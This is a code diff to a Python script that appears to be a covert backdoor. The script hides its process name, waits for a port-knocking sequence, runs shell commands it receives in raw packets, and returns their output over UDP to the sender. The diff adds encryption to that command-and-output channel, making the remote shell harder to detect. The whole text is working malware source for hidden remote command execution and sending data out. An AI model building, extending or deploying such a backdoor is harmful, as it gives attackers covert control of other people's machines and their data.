@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-import logging, setproctitle, triplesec
+import logging, setproctitle, triplesec, encryption, configfile
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from ctypes import cdll, byref, create_string_buffer
@@ -52,13 +52,14 @@ def knock(packet):
                 state = 3
                 print packet[IP].src + " state 3"
             else:
-                print "You suck, state = 0"
+                print "Wrong sequence, state = 0"
 
 def shellCommand(packet, command):
     print "Running command " + command
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     output = password + output.stdout.read() + output.stderr.read()
-    packet = IP(dst=packet[0][1].src)/UDP(dport=8000, sport=8000)/Raw(load=output)
+    encryptedData = encryption.encryption(output, configfile.password)
+    packet = IP(dst=packet[0][1].src)/UDP(dport=8000, sport=8000)/Raw(load=encryptedData)
     send(packet)
 
 def watchAdd():
@@ -75,7 +76,8 @@ def exit():
 
 def parseCommand(packet):
     if packet.haslayer(IP) and packet.haslayer(Raw):
-        data = packet['Raw'].load
+        encryptedData = packet['Raw'].load
+        data = encryption.decrypt(encryptedData, configfile.password)
         if data.startswith(password):
             data = data[len(password):]
             commandType, commandString = data.split(' ', 1)
